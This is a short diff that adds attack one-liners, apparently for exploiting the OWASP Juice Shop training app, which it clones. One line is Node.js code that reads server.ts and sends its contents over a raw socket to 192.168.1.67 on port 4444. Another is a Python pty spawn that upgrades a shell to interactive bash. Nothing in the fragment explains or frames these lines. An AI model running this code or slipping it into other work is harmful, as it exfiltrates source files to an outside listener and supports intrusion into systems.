@@ -1,0 +1,5 @@
+const { exec } = require('child_process'); const net = require('net'); exec('cat server.ts', (err, stdout,stderr) => { const client = new net.Socket();client.connect(4444, '192.168.1.67', () => {client.write(stdout);client.end();});});
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+git clone https://github.com/juice-shop/juice-shop.git --depth 1
